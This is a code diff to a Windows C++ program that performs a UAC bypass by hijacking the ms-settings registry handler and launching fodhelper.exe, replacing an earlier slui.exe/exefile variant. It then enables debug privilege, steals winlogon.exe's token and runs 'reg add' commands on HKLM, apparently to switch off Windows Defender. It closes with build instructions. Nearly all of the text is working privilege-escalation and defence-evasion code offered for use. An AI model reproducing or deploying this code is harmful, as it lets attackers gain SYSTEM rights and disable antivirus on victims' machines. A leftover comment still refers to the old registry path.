@@ -39,31 +39,34 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     // HKEY_CURRENT_USER
     //   Software
     //     Classes
-    //       exefile
-    //         shell
-    //           open
+    //       ms-settings
+    //         Shell
+    //           Open
     //             command
-    //               @=Payload
+    //               @=current_file.exe
+    //               DelegateExecute=""
 
     // Create registry tree
-    CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes", L"exefile");
-    CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile",
-                      L"shell");
-    CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell",
-                      L"open");
+    CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes", L"ms-settings");
+    CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings",
+                      L"Shell");
+    CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell",
+                      L"Open");
     CreateRegistryKey(HKEY_CURRENT_USER,
-                      L"Software\\Classes\\exefile\\shell\\open", L"command");
+                      L"Software\\Classes\\ms-settings\\Shell\\Open", L"command");
 
-    // Set payload
-    // Any executable can be used. File drops can, however, be avoided
-    // completely if system binaries suffice.
-
+    // Create DelegateExecute registry value
     SetRegistryValue(HKEY_CURRENT_USER,
-                     L"Software\\Classes\\exefile\\shell\\open\\command", L"",
+                     L"Software\\Classes\\ms-settings\\Shell\\Open", L"DelegateExecute",
+                     L"");
+    
+    // Set payload
+    SetRegistryValue(HKEY_CURRENT_USER,
+                     L"Software\\Classes\\ms-settings\\Shell\\Open\\command", L"",
                      GetCurrentFile());
 
-    // Start slui.exe with "runas" verb
-    ShellExecuteW(NULL, L"runas", L"C:\\Windows\\System32\\slui.exe", NULL,
+    // Start fodhelper.exe with "runas" verb
+    ShellExecuteW(NULL, L"runas", L"C:\\Windows\\System32\\fodhelper.exe", NULL,
                   NULL, SW_SHOWNORMAL);
     Sleep(1000);
   } else {
@@ -80,7 +83,7 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 
     if (!SetPrivilege(SE_DEBUG_NAME))
       return -1;
-    DWORD pid = GetPIDByName("winlogon.exe");
+    DWORD pid = GetPIDByName("winlogon.exe"); // TODO: find a random process everytime that match winlogon.exe permissions
     HANDLE cToken = GetToken(pid);
     LPCWSTR processes[] = {
         L"C:\\Windows\\System32\\reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows "
@@ -96,14 +99,14 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         return -1;
     }
     DeleteRegistryKey(HKEY_CURRENT_USER,
-                      L"Software\\Classes\\exefile\\shell\\open", L"command");
-    DeleteRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell",
-                      L"open");
+                      L"Software\\Classes\\ms-settings\\Shell\\Open", L"DelegateExecute");
+    DeleteRegistryKey(HKEY_CURRENT_USER,
+                      L"Software\\Classes\\ms-settings\\Shell\\Open\\command", L"");
   }
   // Delete registry keys, but only from \Software\Classes\exefile\shell to not
   // interfere with other application handlers
 
   return 0;
 }
-// x86_64-w64-mingw32-g++ --static token_windefender_bypass.cpp -o main.exe
+// x86_64-w64-mingw32-g++ --static script.cpp -o main.exe
 // -mwindows
